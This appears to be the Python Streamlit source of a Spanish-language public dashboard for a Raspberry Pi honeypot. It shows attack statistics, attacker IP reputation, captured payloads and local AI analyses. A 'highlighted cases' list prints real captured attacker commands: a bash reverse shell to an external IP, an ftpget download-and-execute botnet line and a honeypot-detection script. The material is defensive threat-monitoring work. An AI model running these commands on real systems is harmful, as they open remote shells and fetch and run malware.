import streamlit as st
import json
import pandas as pd
import os
import time

st.set_page_config(page_title="HoneyPI SOC Lab - Público", page_icon="🛡️", layout="wide")
st.title("🛡️ HoneyPI - SOC Lab Público")
st.subheader("Datos actualizados automáticamente desde una Raspberry Pi 5")
st.caption("⚠️ Este es un espejo público de solo lectura. Se sincroniza vía GitHub cada 30 minutos.")

st.markdown(
    """
    <div style="padding: 8px 0 4px 0;">
        📖 <a href="https://www.linkedin.com/pulse/honeypi-un-soc-casero-con-ia-local-cap%C3%ADtulo-1-pablo-rattin-ntrwf/" target="_blank">
        Leé cómo armamos esto paso a paso →</a>
    </div>
    """,
    unsafe_allow_html=True,
)

auto_refresh = st.sidebar.checkbox("🔄 Auto-actualizar cada 30s", value=False)
st.sidebar.caption("Refresca esta página; los datos en sí se actualizan cada 30 min desde la Pi.")

# --- Rutas relativas al repo ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")

HISTORIAL_PATH = os.path.join(DATA_DIR, "incidentes.json")
IPS_ENRIQUECIDAS_PATH = os.path.join(DATA_DIR, "ips_enriquecidas.json")
PAYLOADS_PATH = os.path.join(DATA_DIR, "payloads_capturados.json")
ESTADO_HW_PATH = os.path.join(DATA_DIR, "estado_hardware.json")

# --- Estado del hardware ---
col1, col2, col3 = st.columns(3)

if os.path.exists(ESTADO_HW_PATH):
    try:
        with open(ESTADO_HW_PATH, "r") as f:
            estado = json.load(f)
        with col1:
            st.metric("🌡️ Temperatura CPU", estado.get("temperatura", "N/A"))
        with col2:
            throttled = estado.get("throttled", "N/A")
            estado_th = "✅ OK" if throttled == "0x0" else f"⚠️ {throttled}"
            st.metric("⚡ Throttling", estado_th)
        with col3:
            st.metric("🕒 Última sincronización", estado.get("actualizado", "N/A"))
    except Exception:
        st.info("Estado de hardware no disponible todavía.")
else:
    st.info("Estado de hardware no disponible todavía.")

st.markdown("---")

# --- Casos destacados: los comandos mas interesantes capturados ---
st.write("### ⭐ Casos Destacados")
st.caption("Los eventos más reveladores capturados hasta ahora, seleccionados manualmente.")

CASOS_DESTACADOS = [
    {
        "titulo": "🔓 Reverse Shell hacia servidor externo",
        "comando": "bash -i >& /dev/tcp/45.33.32.156/4444 0>&1",
        "descripcion": "Técnica clásica de post-explotación: el atacante intenta abrir una shell interactiva reversa hacia un servidor de control remoto, en el puerto 4444 (típico de Metasploit/netcat).",
    },
    {
        "titulo": "⛏️ Descarga de criptominer vía FTP",
        "comando": "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
        "descripcion": "Patrón típico de botnet IoT (Mirai/Gafgyt): descarga un binario vía FTP (con fallback a BusyBox para dispositivos embebidos), lo ejecuta y se autoborra. El archivo real capturado (12 MB) fue identificado como criptominer.",
    },
    {
        "titulo": "🕵️ Autodetección de honeypot",
        "comando": '/usr/bin/bash -c printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter',
        "descripcion": "El atacante crea, ejecuta y borra un script de prueba para verificar si tiene permisos reales de escritura/ejecución — una técnica de evasión de sandboxes y honeypots.",
    },
]

for caso in CASOS_DESTACADOS:
    with st.expander(caso["titulo"]):
        st.code(caso["comando"], language="bash")
        st.write(caso["descripcion"])

st.markdown("---")

# --- Incidentes: metricas + estadisticas + historial completo ---
df = pd.DataFrame()

if os.path.exists(HISTORIAL_PATH):
    try:
        with open(HISTORIAL_PATH, "r") as f:
            datos = json.load(f)
        df = pd.DataFrame(datos)

        if not df.empty:
            df = df.iloc[::-1].reset_index(drop=True)

            c1, c2, c3 = st.columns(3)
            with c1:
                st.metric("🚨 Total de Eventos Capturados", len(df))
            with c2:
                if "ip_origen" in df.columns:
                    st.metric("🌍 IPs Únicas", df["ip_origen"].nunique())
            with c3:
                if "servicio" in df.columns:
                    st.metric("🎯 Protocolo Más Atacado", df["servicio"].value_counts().idxmax())

            st.markdown("---")
            st.write("### 📊 Estadísticas de Ataques")
            e1, e2 = st.columns(2)
            with e1:
                st.write("**Ataques por Protocolo**")
                if "servicio" in df.columns:
                    st.bar_chart(df["servicio"].value_counts())
            with e2:
                st.write("**Top 10 IPs Atacantes**")
                if "ip_origen" in df.columns:
                    st.bar_chart(df["ip_origen"].value_counts().head(10))

            st.write("**Top 10 Comandos Ejecutados**")
            if "comando" in df.columns:
                st.bar_chart(df["comando"].value_counts().head(10))

    except Exception as e:
        st.error(f"Error al procesar incidentes: {e}")
else:
    st.info("⌛ Sin datos de incidentes todavía.")

st.markdown("---")

# --- Geolocalización y reputación ---
st.write("### 🌎 Geolocalización y Reputación de IPs Atacantes")

if os.path.exists(IPS_ENRIQUECIDAS_PATH):
    try:
        with open(IPS_ENRIQUECIDAS_PATH, "r") as f:
            ips_data = json.load(f)

        if ips_data:
            filas, mapa_puntos = [], []
            for ip, info in ips_data.items():
                abuse = info.get("abuseipdb", {})
                geo = info.get("geolocalizacion", {})
                filas.append({
                    "IP": ip,
                    "País": geo.get("pais", "N/A"),
                    "Ciudad": geo.get("ciudad", "N/A"),
                    "ISP / Org": abuse.get("isp") or geo.get("org", "N/A"),
                    "Score Abuso (%)": abuse.get("abuse_confidence_score", "N/A"),
                    "Reportes Previos": abuse.get("total_reports", "N/A"),
                    "Tipo de Uso": abuse.get("usage_type", "N/A"),
                })
                lat, lon = geo.get("lat"), geo.get("lon")
                if lat is not None and lon is not None:
                    mapa_puntos.append({"lat": lat, "lon": lon})

            df_ips = pd.DataFrame(filas)
            g1, g2 = st.columns([2, 1])
            with g1:
                st.write("**Detalle por IP**")
                st.dataframe(df_ips, width='stretch')
            with g2:
                if mapa_puntos:
                    st.write("**Ubicación aproximada**")
                    st.map(pd.DataFrame(mapa_puntos), zoom=1)

            r1, r2 = st.columns(2)
            with r1:
                score_promedio = df_ips["Score Abuso (%)"].replace("N/A", pd.NA).dropna().astype(float).mean()
                if pd.notna(score_promedio):
                    st.metric("Score de Abuso Promedio", f"{score_promedio:.0f}%")
            with r2:
                st.write("**Países de origen**")
                st.bar_chart(df_ips["País"].value_counts())
        else:
            st.info("El archivo de IPs enriquecidas está vacío todavía.")
    except Exception as e:
        st.error(f"Error al procesar IPs enriquecidas: {e}")
else:
    st.info("⌛ Sin datos de geolocalización todavía.")

st.markdown("---")

# --- Payloads capturados ---
st.write("### 🎯 Payloads Reales Capturados")

if os.path.exists(PAYLOADS_PATH):
    try:
        with open(PAYLOADS_PATH, "r") as f:
            payloads = json.load(f)

        if payloads:
            st.metric("Total de Payloads Capturados", len(payloads))
            df_payloads = pd.DataFrame(payloads).iloc[::-1].reset_index(drop=True)
            df_payloads["VirusTotal"] = df_payloads["sha256"].apply(
                lambda h: f"https://www.virustotal.com/gui/file/{h}"
            )

            def _veredicto_vt(fila):
                vt = fila.get("virustotal") if isinstance(fila, dict) else None
                if not isinstance(vt, dict):
                    return "⚪ Sin consultar"
                if vt.get("error"):
                    return "⚪ Sin consultar (API no configurada)"
                if vt.get("conocido") is False:
                    return "🟡 Hash no visto antes"
                if vt.get("conocido") is True:
                    maliciosos = vt.get("maliciosos", 0)
                    total = (
                        maliciosos
                        + vt.get("sospechosos", 0)
                        + vt.get("inofensivos", 0)
                        + vt.get("sin_detectar", 0)
                    )
                    if maliciosos > 0:
                        return f"🔴 Malicioso ({maliciosos}/{total} motores)"
                    return f"🟢 Limpio (0/{total} motores)"
                return "⚪ Sin consultar"

            df_payloads["Veredicto VirusTotal"] = [_veredicto_vt(p) for p in payloads[::-1]]

            columnas_mostrar = ["timestamp", "nombre_archivo", "tamano_bytes", "Veredicto VirusTotal", "VirusTotal"]
            columnas_disponibles = [c for c in columnas_mostrar if c in df_payloads.columns]
            st.dataframe(
                df_payloads[columnas_disponibles],
                width='stretch',
                column_config={"VirusTotal": st.column_config.LinkColumn("VirusTotal", display_text="Ver análisis")},
            )
        else:
            st.info("Todavía no se capturó ningún payload real. La vigilancia sigue activa.")
    except Exception as e:
        st.error(f"Error al procesar payloads: {e}")
else:
    st.info("⌛ Sin datos de payloads todavía.")

st.markdown("---")

# --- Último análisis IA + historial completo de comandos ---
if not df.empty:
    st.write("### 🔍 Detalle del Último Análisis de la IA")
    ultimo = df.iloc[0]
    comando_txt = ultimo.get("comando", "N/A")
    analisis_txt = ultimo.get("analisis", "N/A")
    ip_txt = ultimo.get("ip_origen", "N/A")
    st.info(
        f"**IP de origen:** `{ip_txt}`\n\n"
        f"**Comando ejecutado:** `{comando_txt}`\n\n"
        f"**Diagnóstico de la IA:** {analisis_txt}"
    )

    st.write("### 🕒 Historial Completo de Ataques (con análisis de IA)")
    st.dataframe(df, width='stretch')

st.markdown("---")
st.caption("Proyecto HoneyPI — honeypot + IA local en Raspberry Pi 5. Código completo en GitHub: github.com/rattinp/soc-lab-raspberry-pi")

st.markdown(
    """
    <div style="text-align: center; padding-top: 10px; opacity: 0.7; font-size: 0.85em;">
        Por Pablo Rattín —
        <a href="https://www.linkedin.com/in/pablorattin" target="_blank">LinkedIn</a> ·
        <a href="https://www.linkedin.com/pulse/honeypi-un-soc-casero-con-ia-local-cap%C3%ADtulo-1-pablo-rattin-ntrwf/" target="_blank">Artículo completo</a> ·
        <a href="https://praxiscybersecurity.com" target="_blank">Praxis Cybersecurity</a>
    </div>
    """,
    unsafe_allow_html=True,
)

if auto_refresh:
    time.sleep(30)
    st.rerun()
